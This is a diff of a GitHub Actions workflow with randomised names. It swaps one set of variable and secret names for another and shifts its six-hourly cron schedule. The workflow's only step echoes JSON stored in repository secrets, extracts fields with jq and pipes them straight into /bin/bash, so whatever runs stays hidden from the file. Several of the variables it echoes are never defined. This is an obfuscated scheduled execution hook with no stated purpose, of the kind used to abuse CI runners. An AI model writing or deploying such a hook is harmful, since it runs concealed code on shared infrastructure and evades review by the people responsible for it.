@@ -2,24 +2,22 @@ name: jixinyue4318
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 2/6 * * *'
+    - cron: '23 4/6 * * *'
 
-jobs:  # 3235
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: jixinyue4318
         env:
-          wlpjc00406: ${{ secrets.wlpjc00406 }}
+          tyma5: ${{ secrets.tyma5 }}
         run: |
-          echo $wlpjc00406 | jq -r .nules7035 | /bin/bash
-          echo $jin15391 | jq -r .pc935 | /bin/bash
-          echo $k890 | jq -r .cmz949 | /bin/bash
-          echo $v92084 | jq -r .kll92496 | /bin/bash
-          echo $hp990 | jq -r .tq9 | /bin/bash
-          echo $fsd5938 | jq -r .stinp96 | /bin/bash
-          echo $ve2 | jq -r .ji068 | /bin/bash
-          echo $jhu995 | jq -r .efl89639 | /bin/bash
-          echo $nhz5 | jq -r .kq92 | /bin/bash
+          echo $tyma5 | jq -r .czjus7795 | /bin/bash
+          echo $ubxuu62 | jq -r .g393 | /bin/bash
+          echo $vvn84493 | jq -r .cr7923 | /bin/bash
+          echo $m66510 | jq -r .aa66 | /bin/bash
+          echo $egefr787 | jq -r .o9920 | /bin/bash
+          echo $avkm695 | jq -r .fo0940 | /bin/bash
+          echo $zu9 | jq -r .kuyya5 | /bin/bash
 
